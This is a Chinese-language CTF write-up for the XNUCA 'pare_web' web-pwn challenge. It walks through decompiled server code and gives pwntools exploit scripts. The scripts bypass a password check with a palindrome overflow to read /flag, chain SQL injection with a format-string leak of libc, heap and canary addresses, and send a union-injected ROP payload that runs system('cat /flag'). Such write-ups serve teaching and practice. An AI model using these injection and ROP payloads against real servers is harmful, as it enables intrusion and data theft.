# pare_web

参考[p4nda]( http://p4nda.top/2018/12/06/xnuca-final-paraweb/ )大佬博客复现

环境`ubuntu16.04 libc2.23`

程序跑不起来可以

```
sudo apt-get install mysql-server mysql-client libmysqlclient-dev
```

题目类型是web_pwn，程序实现了`HTTP`的`GET` 和 `POST`请求，两个方法各有一个漏洞

## GET方法处的漏洞：

```c
 s1 = (char *)sub_40247C("username");
      if ( s1 )
      {
        passwd = (const char *)sub_40247C("password");
        if ( passwd )
        {
          if ( !strcmp(s1, "admin") )
          {
            if ( (unsigned int)sub_402B21(passwd) )
            {
              v9 = (char *)sub_40247C("menu");
              if ( v9 )
              {
                v10 = (const char *)sub_40247C("para");
                if ( !strcmp(v9, "parsefile") )
                {
                  sub_402BF2(v10);		!!!
                }
                else if ( !strcmp(v9, "request") )
                {
                  sub_402DDA(v10, "request");
                }
                else if ( !strcmp(v9, "upload") )
                {
                  v2 = sub_40247C("filename");
                  sub_402CC9(v10, (__int64)v2);
//跟进sub_402BF2
void __fastcall sub_402BF2(const char *a1)
{
  char *s1; // [rsp+18h] [rbp-18h]
  char *s; // [rsp+20h] [rbp-10h]
  FILE *stream; // [rsp+28h] [rbp-8h]

  if ( !strcmp(ip_addr, "127.0.0.1") )
  {
    s1 = (char *)get_value("Credentials");
    if ( s1 )
    {
      if ( !strcmp(s1, "LG GRAM") )
      {
        s = (char *)malloc(0x51uLL);
        stream = fopen(a1, "rb");
        if ( stream )
        {
          fgets(s, 0x50, stream);
          write(1, s, 0x50uLL);
          fclose(stream);
          free(s);
        }                    
```

任意读文件，所以我们可以用这个来打开flag文件，但是要一绕过`admin`的验证

而验证密码的函数也是又漏洞的：

```c
signed __int64 __fastcall sub_402B21(const char *passwd)
{
  signed int i; // [rsp+14h] [rbp-Ch]

  if ( strlen(passwd) > 0x40 || strlen(passwd) <= 0x13 )
    return 0LL;
  if ( !strstr(passwd, "admin") )
    return 0LL;
  strcpy(&dest, passwd);
  strcat(&dest, passwd);
  for ( i = 0; i <= 63; ++i )
  {
    if ( *(&dest + i) != byte_60F300[63 - i] )
      return 0LL;
  }
  dword_605630 = 1;
  return 1LL;
}
```

可以看见程序先是把`passwd`用`strcpy`拷贝到`dest`处,然后又做了`strcat`操作，而后面用来校验passwd是否正确的`byte_60F300`刚刚好在`dest`的下方,且距离刚刚好为`0x40`

```c
.bss:000000000060F2C0 dest            db ?                    ; DATA XREF: sub_402B21+5E↑o
.bss:000000000060F2C0                                         ; sub_402B21+6F↑o ...
.bss:000000000060F2C1                 align 40h
.bss:000000000060F300 ; _BYTE byte_60F300[192]
.bss:000000000060F300 byte_60F300     db 0C0h dup(?)          ; DATA XREF: sub_402B21+79↑o
```

所以我们只要输入开头为`admin`并且长度为`0x40`回文串的`passwd`即可绕过检测，进行任意读文件

exp为：

```python
    # use backdoor to get flag
	r = remote("127.0.0.1",8080)
	payload = '''GET /login.html?username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=parsefile&para=/flag HTTP/1.1
	Credentials: LG GRAM
	'''
	r.send(payload)
	print r.recvrepeat()
```

## POST方法处的漏洞：

可以看见有`sql`注入和格式化字符串漏洞,sql语句是拼接得来的，作为sql注入菜鸡，我只知道截断（

```c
 if ( !strcmp(haystack + 1, "cart.html") )
    {
      strtok(::s, "=");
      strtok(0LL, "&");
      s1 = strtok(0LL, "=");
      v16 = strtok(0LL, "&");
      if ( s1 && v16 && !strcmp(s1, "cargo") )
      {
        cursor = init_database();
        s = (char *)malloc(0x66uLL);
        snprintf(s, 0x64uLL, "SELECT md5(%s) from cargo;", v16);
        if ( (unsigned int)mysql_query(cursor, s) )
          mysql_error_handler(cursor);
        v19 = mysql_store_result(cursor);
        if ( !v19 )
          mysql_error_handler(cursor);
        mysql_fetch_row(v19);
        v20 = (MYSQL_ROW *)mysql_fetch_row(v19);
        if ( v20->row )
          printf(v20->row, s);
        else
          printf("%s", "(Nil)");
```

所以可以构造这样的语句:

```mysql
mysql> SELECT md5(1) union select "777%4$p-%7$p-%41$p+";#) from cargo;
+----------------------------------+
| md5(1)                           |
+----------------------------------+
| c4ca4238a0b923820dcc509a6f75849b |
| 777%4$p-%7$p-%41$p+              |
+----------------------------------+
2 rows in set (0.00 sec)
```

这样就可以泄露地址了，因为程序是fork出来的，所以泄露的地址没问题

然后就是另一处的sql注入了：

```c
id = (char *)sub_40247C("id");
      if ( id )
      {
        v22 = init_database();
        v3 = strlen("SELECT * FROM cargo where cargo_id=");
        v4 = strlen(id);
        dest = (char *)malloc(v3 + v4 + 1);
        strcpy(dest, "SELECT * FROM cargo where cargo_id=");
        strcat(dest, id);
        if ( (unsigned int)mysql_query(v22, dest) )
          mysql_error_handler(v22);
        v23 = mysql_store_result(v22);
        if ( !v23 )
          mysql_error_handler(v22);
        v11 = mysql_num_fields(v23);
        while ( 1 )
        {
          v24 = (MYSQL_ROW *)mysql_fetch_row(v23);
          if ( !v24 )
            break;
          for ( j = 0; j < v11; ++j )
          {
            if ( !j )
            {
              while ( 1 )
              {
                v25 = (_QWORD *)mysql_fetch_field(v23);
                if ( !v25 )
                  break;
                printf("%s ", *v25);
              }
              puts("\r\n");
            }
            if ( v24[j].row )
            {
              if ( strstr(v24[j].row, "overdue") )
              {
                v6 = strlen(v24[j].row);
                memcpy(&v26, v24[j].row, v6 + 0x40);	//!!!
```

这里的sql语句也是拼接而来的，所以也可以注入，然后如果查询结果里有子串`overdue`，memcpy的时候会多复制`0x40`个字节，一个栈溢出的漏洞，但是由于复制长度的限制，`ROP`最多`0x20`个字节，所以就`system(cat /flag)`吧

这里用到的注入手段是union注入，可以构造这样的语句：

```mysql
mysql> select * from cargo where cargo_id=777 union select "overdueAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",concat('',x'2338400000000000a92817020000000090a35abd947f0000'),concat('',x'00cb26b95aca1d4841414141414141414141414141414141'),"cat /flag";
```

原先一直尝试让mysql查询结果返回不可见字符，unhex可以是可以，但是不好用，最后看了出题人的exp，可以用`concat`来完美解决这一问题

所以exp为：

```python
from pwn import *

def main(host,port=20508):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./server_strip")
		# gdb.attach(p,"b *0x000000000401FE9")
	# use backdoor to get flag
	# r = remote("127.0.0.1",8080)
	# payload = '''GET /login.html?username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=parsefile&para=/flag HTTP/1.1
	# Credentials: LG GRAM
	# '''
	# r.send(payload)
	# print r.recvrepeat()
	
	# use string format attack
	# leak
	sleep(3)
	r = remote("127.0.0.1",8080)
	payload = '''POST /cart.html?cargo=1); HTTP/1.1	\r
	Host: 127.0.0.1\r\n\r\n
	A=B&cargo=1) union select "777%4$p-%7$p-%41$p+";#'''
	r.send(payload)
	r.recvuntil("777")
	libc.address = int(r.recvuntil('-',drop=True),16)-0x3c5258
	info("libc : " + hex(libc.address))
	heap = int(r.recvuntil('-',drop=True),16)
	info("heap : " + hex(heap))
	canary = int(r.recvuntil('+',drop=True),16)
	info("canary : " + hex(canary))
	r.close()
	
	
	# gdb.attach(p,"b *0x00000000040230B")
	# pause()
	r = remote("127.0.0.1",8080)
	payload = '''POST /product.html? HTTP/1.1\r
	Host: 127.0.0.1\r\n\r\n'''
	payload += 'a=b&id=777 union select '
	payload += '"overdue'+'A'*104
	p_rdi = 0x0000000000403823
	rop = p64(p_rdi)+p64(heap+0x3acbc)+p64(libc.symbols['system'])
	payload += '","1111111",%s,"cat /flag"'%("concat('',x'%s')"%(p64(canary).encode('hex')+'41'*0x18+rop.encode('hex')))
	# 0x0000000000403823 : pop rdi ; ret
	r.send(payload)
	print r.recvrepeat()
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(args["REMOTE"])
```

